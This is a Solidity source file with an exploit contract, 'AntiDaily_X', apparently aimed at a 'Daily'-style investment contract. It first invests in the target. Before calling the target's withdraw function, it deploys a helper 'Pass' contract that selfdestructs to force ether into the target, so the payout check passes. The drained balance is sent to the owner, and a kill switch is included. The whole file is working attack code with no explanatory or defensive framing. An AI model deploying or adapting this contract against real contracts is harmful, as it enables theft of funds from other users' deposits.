1 pragma solidity ^0.5.0;
2 
3 contract Pass {
4     constructor(address payable targetAddress) public payable {
5         selfdestruct(targetAddress);
6     }
7 }
8 
9 interface TargetInterface {
10     function checkBalance() external view returns (uint256);
11     function withdraw() external returns (bool);
12 }
13 
14 contract AntiDaily_X {
15     address payable private owner;
16     
17     modifier onlyOwner {
18         require(msg.sender == owner);
19         _;
20     }
21 
22     constructor() public payable {
23         owner = msg.sender;
24     }
25     
26     function investTargetMsgValue(address payable targetAddress) public payable {
27         investTargetAmount(targetAddress, msg.value);
28     }
29 
30     function investTargetAmount(address payable targetAddress, uint256 amount) public payable onlyOwner {
31         (bool success, bytes memory data) = targetAddress.call.value(amount)("");
32         require(success);
33         data; // make compiler happy
34     }
35 
36     function withdrawTarget(address payable targetAddress, bool toOwner) public payable onlyOwner {
37         uint256 targetBalanceTotal = targetAddress.balance;
38         TargetInterface target = TargetInterface(targetAddress);
39         uint256 targetBalanceUser = target.checkBalance();
40 
41         if (targetBalanceUser >= targetBalanceTotal) {
42             uint256 needAdd = targetBalanceUser - targetBalanceTotal + 1 wei;
43             require(address(this).balance >= needAdd);
44             (new Pass).value(needAdd)(targetAddress);
45         }
46 
47         target.withdraw();
48         
49         if (toOwner) {
50             owner.transfer(address(this).balance);
51         }
52     }
53     
54     function withdraw() public onlyOwner {
55         owner.transfer(address(this).balance);
56     }
57 
58     function kill() public onlyOwner {
59         selfdestruct(owner);
60     }
61 
62     function () external payable {
63     }
64     
65 }